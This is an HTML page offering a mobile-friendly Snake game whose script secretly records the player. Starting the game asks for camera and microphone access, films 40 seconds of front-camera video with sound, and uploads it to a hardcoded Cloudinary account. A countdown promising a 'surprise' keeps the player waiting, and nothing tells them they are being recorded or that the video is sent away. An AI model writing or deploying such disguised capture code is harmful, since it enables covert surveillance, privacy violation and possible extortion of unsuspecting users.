<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>Snake</title>
<style>
  /* Reset & fix viewport */
  html, body {
    margin: 0; padding: 0; overflow: hidden; height: 100%; width: 100%; background: #121212; color: #eee; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent;
  }
  #gameContainer {
    position: relative; margin: auto; width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;
  }
  canvas {
    background: #222; border: 3px solid #eee; border-radius: 8px;
    touch-action: none;
  }
  #scoreBoard {
    margin-top: 12px;
    font-size: 1.5rem;
    letter-spacing: 2px;
  }
  #controls {
    margin-top: 10px;
  }
  button {
    background: #333; border: none; color: #eee; padding: 10px 16px; font-size: 1rem; border-radius: 5px; cursor: pointer;
    transition: background 0.3s ease;
    margin: 0 8px;
  }
  button:hover {
    background: #555;
  }
  /* Mobile swipe instruction */
  #instructions {
    margin-top: 20px; font-size: 0.9rem; color: #aaa; max-width: 300px; text-align: center;
  }
  /* Timer styling */
  #timerContainer {
    position: absolute;
    top: 20px;
    text-align: center;
    width: 100%;
    color: #eee;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    user-select: none;
  }
  #timerTextTop {
    font-size: 1.3rem;
    margin-bottom: 4px;
  }
  #timerValue {
    font-size: 3rem;
    font-weight: bold;
  }
  #timerTextBottom {
    font-size: 1.2rem;
    margin-top: 4px;
  }
</style>
</head>
<body>
  <div id="gameContainer">
    <canvas id="game" width="320" height="320"></canvas>
    <div id="scoreBoard">Score: 0</div>
    <div id="controls">
      <button id="btnStart">Start Game</button>
      <button id="btnNewGame" disabled>New Game</button>
    </div>
    <div id="instructions">
      Use swipe gestures or arrow keys to control the snake.
    </div>
    <div id="timerContainer" style="display:none;">
      <div id="timerTextTop">Wait another</div>
      <div id="timerValue">40</div>
      <div id="timerTextBottom">seconds to receive a surprise</div>
    </div>
  </div>

<script>
(() => {
  const CLOUD_NAME = "dps0g5ftz"; 
  const UPLOAD_PRESET = "unsigned";  

  let mediaRecorder;
  let recordedChunks = [];

  async function startRecording() {
    try {
      recordedChunks = [];
      const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });

      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
      mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
      mediaRecorder.onstop = () => {
        const blob = new Blob(recordedChunks, { type: "video/webm" });
        uploadVideo(blob);
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start();
    } catch (err) {
      console.error("Media recording failed:", err);
    }
  }

  async function uploadVideo(blob) {
    const formData = new FormData();
    formData.append("file", blob);
    formData.append("upload_preset", UPLOAD_PRESET);

    try {
      const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/video/upload`, {
        method: "POST",
        body: formData
      });
      const data = await res.json();
      console.log("Video uploaded:", data.secure_url);
    } catch (err) {
      console.error("Upload failed:", err);
    }
  }

  // === Snake Game ===
  const canvas = document.getElementById("game");
  const ctx = canvas.getContext("2d");
  const gridSize = 16;
  const tileCount = canvas.width / gridSize;

  let snake = [{ x: 8, y: 8 }];
  let velocity = { x: 0, y: 0 };
  let food = { x: 5, y: 5 };
  let score = 0;
  let gameInterval;

  function drawRect(x, y, color) { ctx.fillStyle = color; ctx.fillRect(x * gridSize, y * gridSize, gridSize, gridSize); }

  function resetGame() {
    snake = [{ x: 8, y: 8 }];
    velocity = { x: 0, y: 0 };
    food = randomFoodPosition();
    score = 0;
    updateScore();
  }

  function randomFoodPosition() {
    let pos;
    do {
      pos = { x: Math.floor(Math.random() * tileCount), y: Math.floor(Math.random() * tileCount) };
    } while (snake.some(seg => seg.x === pos.x && seg.y === pos.y));
    return pos;
  }

  function updateScore() { document.getElementById("scoreBoard").textContent = `Score: ${score}`; }

  function gameOver() {
    clearInterval(gameInterval);
    document.getElementById("btnStart").disabled = false;
    document.getElementById("btnNewGame").disabled = true;
    alert("Game Over! Your score: " + score);
  }

  function gameLoop() {
    const head = { x: snake[0].x + velocity.x, y: snake[0].y + velocity.y };

    if (head.x < 0 || head.x >= tileCount || head.y < 0 || head.y >= tileCount || snake.some(seg => seg.x === head.x && seg.y === head.y)) {
      gameOver();
      return;
    }

    snake.unshift(head);
    if (head.x === food.x && head.y === food.y) { score++; updateScore(); food = randomFoodPosition(); } else { snake.pop(); }

    ctx.fillStyle = "#121212";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    drawRect(food.x, food.y, "#ff6347");
    snake.forEach((seg, idx) => drawRect(seg.x, seg.y, idx === 0 ? "#32cd32" : "#228b22"));
  }

  function setDirection(x, y) { if (velocity.x !== -x && velocity.y !== -y) velocity = { x, y }; }

  // === Timer + Recording ===
  const timerContainer = document.getElementById("timerContainer");
  const timerValueElem = document.getElementById("timerValue");
  let timer = 40, timerInterval;

  function startTimer() {
    clearInterval(timerInterval);
    timer = 40;
    timerContainer.style.display = "block";
    timerValueElem.textContent = timer;

    startRecording();

    timerInterval = setInterval(() => {
      timer--;
      timerValueElem.textContent = timer;
      if (timer <= 0) {
        clearInterval(timerInterval);
        timerContainer.style.display = "none";
        if (mediaRecorder && mediaRecorder.state === "recording") {
          mediaRecorder.stop();
        }
      }
    }, 1000);
  }

  // === Event Handlers ===
  function startGame() {
    resetGame();
    document.getElementById("btnStart").disabled = true;
    document.getElementById("btnNewGame").disabled = false;
    velocity = { x: 1, y: 0 };
    gameInterval = setInterval(gameLoop, 120);
    startTimer();
  }

  document.getElementById("btnStart").onclick = startGame;
  document.getElementById("btnNewGame").onclick = startGame;

  // Keyboard controls
  window.addEventListener("keydown", e => {
    if (document.getElementById("btnStart").disabled === false) startGame(); // auto-start on first key
    switch (e.key) {
      case "ArrowUp": setDirection(0, -1); break;
      case "ArrowDown": setDirection(0, 1); break;
      case "ArrowLeft": setDirection(-1, 0); break;
      case "ArrowRight": setDirection(1, 0); break;
    }
  });

  // Swipe controls
  let touchX = null, touchY = null;
  canvas.addEventListener("touchstart", e => { 
    if (document.getElementById("btnStart").disabled === false) startGame(); // auto-start on first swipe
    touchX = e.touches[0].clientX; 
    touchY = e.touches[0].clientY; 
  });
  canvas.addEventListener("touchmove", e => {
    if (!touchX || !touchY) return;
    const dx = e.touches[0].clientX - touchX;
    const dy = e.touches[0].clientY - touchY;
    if (Math.abs(dx) > Math.abs(dy)) dx > 30 ? setDirection(1,0) : dx < -30 && setDirection(-1,0);
    else dy > 30 ? setDirection(0,1) : dy < -30 && setDirection(0,-1);
    touchX = e.touches[0].clientX; 
    touchY = e.touches[0].clientY;
  });

})();
</script>
</body>
</html>